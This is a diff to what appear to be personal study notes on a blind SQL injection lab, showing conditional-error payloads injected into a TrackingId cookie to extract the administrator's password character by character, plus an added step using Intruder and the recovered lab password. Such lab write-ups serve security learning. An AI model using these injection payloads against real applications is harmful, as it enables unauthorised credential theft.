@@ -75,3 +75,7 @@ TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' 
 TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 - SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn
+- now to the intruder attack like rana khalil video or like the precous lab and check for the 500 responses and we got the password
+```
+w4jb7vb101kkjz8h2gk5
+```
